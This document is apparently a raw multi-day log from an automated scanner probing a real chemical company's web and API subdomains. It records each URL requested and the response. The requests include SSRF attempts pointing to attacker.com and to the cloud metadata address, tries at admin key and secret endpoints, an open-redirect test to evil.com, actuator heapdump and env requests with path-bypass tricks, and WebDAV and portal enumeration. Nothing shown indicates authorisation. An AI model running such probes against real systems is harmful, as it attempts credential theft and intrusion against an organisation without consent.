
## 2026-09-03 09:40:45 UTC


## 2026-09-03 14:03:05 UTC
https://ap-digitalconnect.api.basf.com/admin/host/keys -> HTTP 404
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/<function>?url=http://attacker.com -> HTTP 403
https://ap-eupf.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403

## 2026-09-03 17:55:37 UTC
https://ap-digitalconnect.api.basf.com/admin/keys -> HTTP 404
https://ap-digitalconnect.api.basf.com/runtime/webhooks/host/keys -> HTTP 404
https://ap-eupf.api.basf.com/api/HttpTrigger1?url=http://attacker.com -> HTTP 403
https://ap-eupf.api.basf.com/api/HttpTrigger1 -> HTTP 404
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403
https://ap-digitalconnect.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403
https://dev-ext001.api.basf.com/ -> HTTP 400

## 2026-09-03 21:00:34 UTC
https://ap-digitalconnect.api.basf.com/.azurefunctions/keys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/v2/keys -> HTTP 404
https://ap-eupf.api.basf.com/api/<enum>?url=http://attacker.com -> HTTP 403
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/health -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/list -> HTTP 404
https://dev-ext001.api.basf.com/ -> HTTP 400

## 2026-09-03 23:13:36 UTC
https://ap-digitalconnect.api.basf.com/admin/host/keys?slot=staging -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/host/keys?slot=production -> HTTP 404
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/health -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/list -> HTTP 404
https://dev-ext001.api.basf.com/ -> HTTP 400

## 2026-09-04 01:13:47 UTC
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://ap-digitalconnect.api.basf.com/admin/host/systemkeys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/functions -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/host/status -> HTTP 404

## 2026-09-04 06:06:04 UTC
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-digitalconnect.api.basf.com/admin/host/functionkeys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/system -> HTTP 404

## 2026-09-04 11:37:50 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/api-docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger/ui -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/.well-known/openapi-schema -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://ap-digitalconnect.api.basf.com/admin/host/functionkeys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/system -> HTTP 404

## 2026-09-04 15:26:14 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://ap-digitalconnect.api.basf.com/admin/host/functionkeys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/system -> HTTP 404

## 2026-09-04 18:36:18 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/api-docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger/ui -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/.well-known/openapi-schema -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://e-gate.api.basf.com/ -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce

## 2026-09-04 21:06:33 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/api-docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger/ui -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/.well-known/openapi-schema -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093

## 2026-09-04 23:09:10 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/api-docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger/ui -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/.well-known/openapi-schema -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093

## 2026-09-05 01:11:37 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/api-docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger/ui -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/.well-known/openapi-schema -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://www.basf.com/ -> 200 len=640003
https://my.basf.com/ -> 200 len=204926
https://my.basf.com/` -> 200 len=204936
https://www.basf.com/` -> 200 len=640003

## 2026-09-05 05:58:51 UTC
https://my.basf.com/ -> 200 len=204936
https://my.basf.com/.well-known/openid-configuration -> HTTP 404
https://api.basf.com/ -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/openapi.json -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/swagger.json -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/docs -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/api-docs -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/developer -> ERR <urlopen error [Errno 111] Connection refused>
https://www.basf.com/ -> 200 len=640000
https://prod.api.basf.com -> HTTP 404

## 2026-09-05 10:30:37 UTC
https://api.basf.com/ -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/openapi.json -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/swagger.json -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/docs -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/api-docs -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/developer -> ERR <urlopen error [Errno 111] Connection refused>
https://my.basf.com/ -> 200 len=204926
https://my.basf.com/.well-known/openid-configuration -> HTTP 404
https://www.basf.com/ -> 200 len=639986

## 2026-09-05 13:34:43 UTC
https://api.basf.com/ -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/openapi.json -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/swagger.json -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/docs -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/api-docs -> ERR <urlopen error [Errno 111] Connection refused>
https://api.basf.com/developer -> ERR <urlopen error [Errno 111] Connection refused>
https://my.basf.com/ -> 200 len=204926
https://my.basf.com/.well-known/openid-configuration -> HTTP 404
https://www.basf.com/ -> 200 len=639993
https://my.basf.com/saml/metadata -> 200 len=204926
https://my.basf.com/adfs/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/oauth2/authorize?response_type=code&client_id=test&redirect_uri=https://evil.com -> 200 len=204926

## 2026-09-05 16:26:31 UTC
https://my.basf.com/ -> 200 len=204926
https://my.basf.com/auth/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/basf/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/nidp/.well-known/openid-configuration -> 200 len=204926
https://federation.basf.com/.well-known/openid-configuration -> 200 len=14920
https://prod.api.basf.com/products -> HTTP 404
https://prod.api.basf.com/catalog -> HTTP 404
https://prod.api.basf.com/search -> HTTP 404
https://prod.api.basf.com/user -> HTTP 404
https://prod.api.basf.com/order -> HTTP 404
https://prod.api.basf.com/cart -> HTTP 404
https://prod.api.basf.com/price -> HTTP 404

## 2026-09-05 18:46:19 UTC
https://my.basf.com/ -> 200 len=204936
https://my.basf.com/saml/metadata -> 200 len=204926
https://my.basf.com/adfs/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/oauth2/authorize?response_type=code&client_id=test&redirect_uri=https://evil.com -> 200 len=204936
https://prod.api.basf.com -> HTTP 404
https://www.basf.com/us/en -> 200 len=639943
https://federation.basf.com/nidp/oauth/nam/authz -> HTTP 400
https://my.basf.com/.auth -> 200 len=205013

## 2026-09-05 20:53:00 UTC
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://www.basf.com/us/en -> 200 len=639979
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://federation.basf.com/nidp/oauth/nam/.well-known/openid-configuration -> 200 len=2029
https://federation.basf.com/.well-known/oauth-authorization-server -> 200 len=14920
https://my.basf.com/ -> 200 len=204926
https://my.basf.com/auth/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/basf/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/nidp/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/saml/metadata -> 200 len=204926
https://my.basf.com/.auth -> 200 len=205013
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-…&redirect_uri=https%3A%2F%2Fmy.basf.com%2F.auth -> ERR 'ascii' codec can't encode character '\u2026' in p

## 2026-09-05 22:49:13 UTC
https://my.basf.com/.auth` -> 200 len=204936
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://www.basf.com/us/en -> 200 len=639988
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://federation.basf.com/nidp/oauth/nam/.well-known/openid-configuration -> 200 len=2029
https://federation.basf.com/.well-known/oauth-authorization-server -> 200 len=14920
https://my.basf.com/ -> 200 len=204926
https://my.basf.com/auth/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/basf/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/nidp/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/saml/metadata -> 200 len=204926
https://my.basf.com/.auth -> 200 len=205023

## 2026-09-06 00:56:48 UTC
https://my.basf.com/.auth` -> 200 len=204936
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://www.basf.com/us/en -> 200 len=640035
https://federation.basf.com/nidp/oauth/nam/discovery/registration -> HTTP 404

## 2026-09-06 05:50:55 UTC
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/discovery/registration -> HTTP 404

## 2026-09-06 10:59:08 UTC
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/discovery/registration -> HTTP 404
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https%3A%2F%2Fmy.basf.com%2F.auth -> 200 len=4950

## 2026-09-06 14:16:29 UTC
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://federation.basf.com/nidp/saml2/metadata -> 200 len=?
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https%3A%2F%2Fmy.basf.com%2F.auth -> 200 len=4950

## 2026-09-06 17:13:23 UTC
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://federation.basf.com/nidp/saml2/metadata -> 200 len=?
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https%3A%2F%2Fmy.basf.com%2F.auth -> 200 len=4950

## 2026-09-06 19:22:51 UTC
https://my.basf.com/.auth` -> 200 len=204936
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://federation.basf.com/nidp/saml2/metadata -> 200 len=?
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https%3A%2F%2Fmy.basf.com%2F.auth -> 200 len=4950

## 2026-09-06 21:31:36 UTC
https://my.basf.com/.auth` -> 200 len=204926
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://www.basf.com/us/en -> 200 len=639999

## 2026-09-06 23:16:26 UTC
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://www.basf.com/us/en -> 200 len=639996
https://my.basf.com/ -> 200 len=204926
https://my.basf.com/saml/metadata -> 200 len=204926
https://my.basf.com/adfs/.well-known/openid-configuration -> 200 len=204926
https://my.basf.com/oauth2/authorize?response_type=code&client_id=test&redirect_uri=https://evil.com -> 200 len=204926
https://prod.api.basf.com -> HTTP 404
https://federation.basf.com/nidp/oauth/nam/authz -> HTTP 400
https://my.basf.com/.auth -> 200 len=205013
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-…&redirect_uri=https%3A%2F%2Fmy.basf.com%2F.auth -> ERR 'ascii' codec can't encode character '\u2026' in p

## 2026-09-07 01:10:36 UTC
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://www.basf.com/us/en -> 200 len=639982

## 2026-09-07 06:25:54 UTC
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://www.basf.com/us/en -> 200 len=640014
https://procurement.basf.com/irj/go/km/navigation/documents/` -> 200 len=236
https://procurement.basf.com/irj/go/km` -> 200 len=236
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/basfits.com~fw~navigation.MetaNavigation?selected_language=en` -> ERR <urlopen error [Errno -2] Name or service not know

## 2026-09-07 12:55:56 UTC
https://procurement.basf.com/irj/go/km/navigation/documents/ -> 200 len=236
https://procurement.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/basfits.com~fw~navigation.MetaNavigation?selected_language=en -> ERR <urlopen error [Errno -2] Name or service not know
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/com.sap.km.cm.documents/ -> HTTP 500
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://procurement.basf.com/irj/go/km/navigation/documents/` -> 200 len=236
https://procurement.basf.com/irj/go/km/docs/documents/newFramework/` -> 200 len=236
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/basfits.com~fw~navigation.MetaNavigation?selected_language=en` -> ERR <urlopen error [Errno -2] Name or service not know
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/com.sap.km.cm.documents/` -> 200 len=236
https://tm.basf.com` -> ERR <urlopen error [Errno -2] Name or service not know
https://passage-europe.basf.com` -> ERR <urlopen error [Errno -2] Name or service not know

## 2026-09-07 18:28:56 UTC
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/com.sap.km.cm.documents/?path=/documents/newFramework -> HTTP 500
https://procurement.basf.com/irj/servlet/webdav/documents/newFramework/ -> 200 len=236
https://tm.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://passage-europe.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://vss3.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/com.sap.km.cm.documents/?path=/documents/newFramework` -> HTTP 500
https://procurement.basf.com/irj/servlet/webdav/documents/newFramework/` -> 200 len=236
https://tm.basf.com/irj/go/km/docs/documents/newFramework/` -> HTTP 404
https://passage-europe.basf.com/irj/go/km/docs/documents/newFramework/` -> 200 len=235
https://vss3.basf.com/irj/go/km/docs/documents/newFramework/` -> 200 len=235

## 2026-09-07 21:43:56 UTC
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/com.sap.km.cm.documents/?path=/documents/newFramework -> HTTP 500
https://procurement.basf.com/irj/servlet/webdav/documents/newFramework/ -> 200 len=236
https://tm.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://passage-europe.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://vss3.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://my.basf.com/.auth -> 200 len=205013

## 2026-09-07 23:57:24 UTC
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/com.sap.km.cm.documents/?path=/documents/newFramework` -> HTTP 500
https://procurement.basf.com/irj/servlet/webdav/documents/newFramework/` -> 200 len=236
https://tm.basf.com/irj/go/km/docs/documents/newFramework/` -> HTTP 404
https://passage-europe.basf.com/irj/go/km/docs/documents/newFramework/` -> 200 len=235
https://vss3.basf.com/irj/go/km/docs/documents/newFramework/` -> 200 len=235
https://federation.basf.com/nidp/.well-known/openid-configuration -> 200 len=14920
https://www.basf.com/us/en -> 200 len=640024
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https%3A%2F%2Fmy.basf.com%2F.auth -> 200 len=4950
https://procurement.basf.com/irj/portal/procurement` -> 200 len=236
https://procurement.basf.com/irj/go/km/docs/documents/newFramework/` -> 200 len=236

## 2026-09-08 04:38:38 UTC
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/com.sap.km.cm.documents/?path=/documents/newFramework -> HTTP 500
https://procurement.basf.com/irj/servlet/webdav/documents/newFramework/ -> 200 len=236
https://tm.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://passage-europe.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://vss3.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://my.basf.com/.auth -> 200 len=205023

## 2026-09-08 09:02:28 UTC
https://procurement.basf.com/irj/servlet/prt/portal/prtroot/com.sap.km.cm.documents/?path=/documents/newFramework -> HTTP 500
https://procurement.basf.com/irj/servlet/webdav/documents/newFramework/ -> 200 len=236
https://tm.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://passage-europe.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://vss3.basf.com/irj/go/km/docs/documents/newFramework/ -> 200 len=?
https://federation.basf.com/nidp/oauth/nam/authz?response_type=code&client_id=86cc4bf9-cfdf-4215-bd7c-e9fbbbe626d4&redirect_uri=https://my.basf.com/.auth&scope=openid+profile+refresh_token&acr_values=3IAM/Login/External -> 200 len=684
https://federation.basf.com/nidp/oauth/nam/token -> HTTP 405
https://my.basf.com/.auth -> 200 len=205013
https://rep.basf.com/actuator/heapdump` -> HTTP 404
https://rep.basf.com/actuator/env..;` -> HTTP 404
https://rep.basf.com/actuator;/env` -> HTTP 404
https://rep.basf.com/wicket/bookmarkable/org.apache.wicket.Application` -> HTTP 404
